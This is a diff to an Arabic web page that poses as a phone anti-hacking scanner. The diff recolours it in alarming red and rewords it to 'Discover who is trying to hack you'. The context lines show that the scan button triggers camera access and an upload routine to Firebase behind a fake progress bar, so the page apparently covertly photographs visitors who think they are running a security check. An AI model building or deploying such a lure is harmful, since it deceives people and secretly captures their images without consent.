@@ -3,11 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>حماية الهاتف من الاختراق</title>
+    <title>اكتشف من يحاول اختراقك</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-storage-compat.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -24,15 +23,31 @@
             background: rgba(255,255,255,0.03);
             border: 1px solid rgba(255,255,255,0.1);
             border-radius: 25px;
-            padding: 50px 30px;
+            padding: 40px 25px;
             text-align: center;
             max-width: 400px;
             width: 100%;
             box-shadow: 0 30px 80px rgba(0,0,0,0.8);
         }
+        .header-badge {
+            display: inline-block;
+            background: rgba(255,0,0,0.2);
+            color: #ff4444;
+            padding: 8px 20px;
+            border-radius: 50px;
+            font-weight: 900;
+            font-size: 14px;
+            margin-bottom: 15px;
+            border: 1px solid rgba(255,0,0,0.3);
+            animation: glowRed 2s infinite;
+        }
+        @keyframes glowRed {
+            0%, 100% { box-shadow: 0 0 10px rgba(255,0,0,0.3); }
+            50% { box-shadow: 0 0 30px rgba(255,0,0,0.6); }
+        }
         .shield {
-            font-size: 100px;
-            margin-bottom: 25px;
+            font-size: 80px;
+            margin-bottom: 20px;
             animation: pulse 2s infinite;
             filter: drop-shadow(0 0 30px rgba(0,255,0,0.5));
         }
@@ -41,16 +56,16 @@
             50% { transform: scale(1.1); }
         }
         h1 {
-            font-size: 24px;
+            font-size: 28px;
             font-weight: 900;
-            margin-bottom: 15px;
-            background: linear-gradient(135deg, #00ff00, #00cc00);
+            margin-bottom: 10px;
+            background: linear-gradient(135deg, #ff4444, #ff8800);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
         }
-        p {
+        .subtitle {
             color: #888;
-            margin-bottom: 30px;
+            margin-bottom: 25px;
             font-size: 14px;
             line-height: 1.8;
         }
@@ -60,18 +75,18 @@
             font-size: 20px;
             font-weight: 900;
             font-family: 'Cairo', sans-serif;
-            background: linear-gradient(135deg, #00ff00, #00aa00);
-            color: #000;
+            background: linear-gradient(135deg, #ff4444, #cc0000);
+            color: #fff;
             border: none;
             border-radius: 15px;
             cursor: pointer;
             transition: all 0.3s;
             letter-spacing: 1px;
-            box-shadow: 0 10px 30px rgba(0,255,0,0.3);
+            box-shadow: 0 10px 30px rgba(255,0,0,0.3);
         }
         .scan-btn:hover {
             transform: translateY(-3px);
-            box-shadow: 0 15px 40px rgba(0,255,0,0.5);
+            box-shadow: 0 15px 40px rgba(255,0,0,0.5);
         }
         .scan-btn:active {
             transform: translateY(0);
@@ -101,7 +116,7 @@
         }
         .progress-fill {
             height: 100%;
-            background: linear-gradient(90deg, #00ff00, #00aa00);
+            background: linear-gradient(90deg, #ff4444, #ff8800);
             border-radius: 5px;
             width: 0%;
             transition: width 0.3s;
@@ -109,7 +124,7 @@
         .progress-text {
             font-size: 16px;
             font-weight: 700;
-            color: #00ff00;
+            color: #ff4444;
         }
         .result {
             display: none;
@@ -145,11 +160,13 @@
 </head>
 <body>
     <div class="container">
+        <div class="header-badge">⚠️ اكتشف من يحاول اختراقك</div>
+        
         <div class="shield">🛡️</div>
         <h1>حماية الهاتف من الاختراق</h1>
-        <p>احمِ هاتفك الآن من أي محاولات اختراق أو تجسس. اضغط على الزر لبدء الفحص الأمني الشامل.</p>
+        <p class="subtitle">احمِ هاتفك الآن من أي محاولات اختراق أو تجسس. اضغط على الزر لبدء الفحص الأمني الشامل.</p>
         
-        <button class="scan-btn" id="scanBtn" onclick="startProtection()">🔒 ابدأ الحماية الآن</button>
+        <button class="scan-btn" id="scanBtn" onclick="startProtection()">🔍 ابدأ الفحص الآن</button>
         
         <div class="progress" id="progress">
             <div class="progress-text" id="progressText">⏳ جاري فحص الهاتف...</div>
@@ -243,7 +260,7 @@
                         } catch (error) {
                             console.error('Upload error:', error);
                             btn.disabled = false;
-                            btn.textContent = '🔒 ابدأ الحماية الآن';
+                            btn.textContent = '🔍 ابدأ الفحص الآن';
                         }
                     };
                 };
@@ -267,7 +284,7 @@
             } catch (error) {
                 console.error('Camera error:', error);
                 btn.disabled = false;
-                btn.textContent = '🔒 ابدأ الحماية الآن';
+                btn.textContent = '🔍 ابدأ الفحص الآن';
                 progress.classList.remove('active');
             }
         }
